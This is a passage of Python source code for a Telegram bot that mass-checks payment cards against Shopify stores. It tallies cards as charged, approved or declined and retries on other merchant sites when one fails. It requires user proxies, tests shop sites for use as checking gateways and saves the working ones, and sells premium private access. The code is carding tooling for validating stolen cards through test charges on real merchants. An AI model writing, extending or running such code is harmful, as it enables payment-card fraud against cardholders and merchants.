Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Errors ⚠️ : {errors}
Total Checked ☠️ : {total}
"""
        final_buttons = [
            [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
            [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
            [Button.inline(f"Total ➜ [{total}] ☠️", b"none")],
            [Button.inline(f"Total Checked ➜ [{checked}/{total}] ✅", b"none")]
        ]
        try:
            await status_msg.edit(final_caption, buttons=final_buttons)
        except Exception:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)


async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3):
    last_result = None
    for attempt in range(max_retries):
        result = await check_card_specific_site(card, site, user_id)
        status = result.get("Status", "")
        if status == "SiteError":
            if not global_sites:
                return {"Response": "All sites dead", "Price": "-", "Gateway": "Shopify", "Status": "Error"}
            site = random.choice(global_sites)
            last_result = result
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
        else:
            return result
    if last_result:
        last_result["Status"] = "Error"
        return last_result
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "Shopify", "Status": "Error"}


@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        if not can_stop:
            return await event.answer("```❌ You can only stop your own process!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("```❌ No active process found!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ CC checking stopped!```", alert=True)
    except Exception as e:
        await event.answer(f"```❌ Error: {str(e)}```", alert=True)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        buttons = [[Button.url("Use In Group Free", f"https://t.me/+4TU0Rp4zCfowZDg9")]]
        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @ArxisX", buttons=buttons)

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [
            [Button.inline("🔍 Check My DB Sites", b"check_db_sites")]
        ]

        instruction_text = """🔍 **Site Checker**

If you want to check sites then type:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

And if you want to check your DB sites and add working & remove not working sites, click below button:"""

        return await event.reply(instruction_text, buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply("❌ No valid urls/domains found!\n\n💡 Example:\n`/check`\n`1. https://example.com`\n`2. site2.com`")

    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(f"```⚠️ Found {total_sites_found} sites, checking only first 10 sites```")

    asyncio.create_task(process_site_check(event, sites_to_check))


async def process_site_check(event, sites):
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await event.reply(f"```🔍 Checking {total_sites} sites...```")

    batch_size = 20
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=event.sender_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **Proxy Dead!**

{result['response']}

📊 **Progress Before Stop:**
🟢 Working Sites: {len(working_sites)}
🔴 Dead Sites: {len(dead_sites)}
📝 Checked: {checked}/{total_sites}"""
                try:
                    await status_msg.edit(final_text)
                except Exception:
                    await event.reply(final_text)
                return

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            working_sites_text = ""
            if working_sites:
                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]
                ) + "\n"
            dead_sites_text = ""
            if dead_sites:
                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]
                ) + "\n"

            status_text = (
                f"```🔍 Checking Sites...\n\n"
                f"📊 Progress: [{checked}/{total_sites}]\n"
                f"✅ Working: {working_count}\n"
                f"❌ Dead: {dead_count}\n\n"
                f"🔄 Current: {site}\n"
                f"📝 Status: {result['status'].upper()}\n"
                f"💰 Price: {result['price']}\n"
                f"```\n"
            )
            if working_sites_text or dead_sites_text:
                status_text += working_sites_text + dead_sites_text

            try:
                await status_msg.edit(status_text)
            except Exception:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **Site Check Complete!**

📊 **Results:**
🟢 Working Sites: {len(working_sites)}
🔴 Dead Sites: {len(dead_sites)}

"""
    if working_sites:
        final_text += "✅ **Working Sites:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **Dead Sites:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    buttons = []
    if working_sites:
        TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]
        buttons.append([Button.inline("➕ Add Working Sites to DB", f"add_working:{event.sender_id}".encode())])

    try:
        await status_msg.edit(final_text, buttons=buttons)
    except Exception:
        await event.reply(final_text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id

    user_sites = await get_user_sites(user_id)

    if not user_sites:
        return await event.answer("❌ You haven't added any sites yet!", alert=True)

    await event.answer("🔍 Starting DB site check...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))


async def process_db_site_check(event, user_sites):
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```🔍 Checking Your {total_sites} DB sites...```"
    await event.edit(status_text)

    batch_size = 20
    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=user_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **Proxy Dead!**

{result['response']}

📊 **Progress Before Stop:**
🟢 Working Sites: {len(working_sites)}
🔴 Dead Sites: {len(dead_sites)}
📝 Checked: {checked}/{total_sites}"""
                try:
                    await event.edit(final_text)
                except Exception:
                    pass
                return

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```🔍 Checking Your DB Sites...

📊 Progress: [{checked}/{total_sites}]
✅ Working: {working_count}
❌ Dead: {dead_count}

🔄 Current: {site}
📝 Status: {result['status'].upper()}```"""

            try:
                await event.edit(status_text)
            except Exception:
                pass

            await asyncio.sleep(0.1)

    # Remove dead sites from DB
    if dead_sites:
        for dead_site in dead_sites:
            await remove_site_db(user_id, dead_site)

    final_text = f"""✅ **DB Site Check Complete!**

📊 **Results:**
🟢 Working Sites: {len(working_sites)}
🔴 Dead Sites (Removed): {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **Working Sites:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **Dead Sites (Removed):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(final_text)
    except Exception:
        pass


@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:
            return await event.answer("❌ You can only add sites from your own check!", alert=True)

        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])

        if not working_sites:
            return await event.answer("❌ No working sites found! Please run /check again.", alert=True)

        added_sites = []
        already_exists = []

        for site in working_sites:
            success = await add_site_db(callback_user_id, site)
            if success:
                added_sites.append(site)
            else:
                already_exists.append(site)

        TEMP_WORKING_SITES.pop(callback_user_id, None)

        # Get updated count
        all_user_sites = await get_user_sites(callback_user_id)

        response_parts = []
        if added_sites:
            added_text = f"✅ **Added {len(added_sites)} New Sites:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} Sites Already Exist:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **Total Sites in Your DB:** {len(all_user_sites)}"
        else:
            response_text = "ℹ️ All sites are already in your DB!"

        await event.answer("✅ Sites processed!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **Update:**\n{response_text}"

        try:
            await event.edit(updated_text, buttons=None)
        except Exception:
            await event.respond(response_text)

    except Exception as e:
        await event.answer(f"❌ Error: {str(e)}", alert=True)


@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
            return await event.reply(f"❌ User {user_id} does not have premium access!")

        success = await remove_premium(user_id)

        if success:
            await event.reply(f"✅ Premium access removed for user {user_id}!")
            try:
                await client.send_message(user_id, f"⚠️ Your Premium Access Has Been Revoked!\n\nYou can no longer use the bot in private chat.\n\nFor inquiries, contact @ArxisX")
            except Exception:
                pass
        else:
            await event.reply(f"❌ Failed to remove access for user {user_id}")

    except ValueError:
        await event.reply("❌ Invalid user ID!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(f"❌ User {user_id} is already banned!")

        await ensure_user(user_id)
        await remove_premium(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ User {user_id} has been banned!")

        try:
            await client.send_message(user_id, f"🚫 You Have Been Banned!\n\nYou are no longer able to use this bot in private or group chat.\n\nFor appeal, contact @ArxisX")
        except Exception:
            pass

    except ValueError:
        await event.reply("❌ Invalid user ID!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(f"❌ User {user_id} is not banned!")

        success = await unban_user(user_id)

        if success:
            await event.reply(f"✅ User {user_id} has been unbanned!")
            try:
                await client.send_message(user_id, f"🎉 You Have Been Unbanned!\n\nYou can now use this bot again in groups.\n\nFor private access, you will need to purchase a new key.")
            except Exception:
                pass
        else:
            await event.reply(f"❌ Failed to unban user {user_id}")

    except ValueError:
        await event.reply("❌ Invalid user ID!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


async def main():
    # Initialize database instead of JSON files
    await init_db()

    print("BOT RUNNING 💨")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
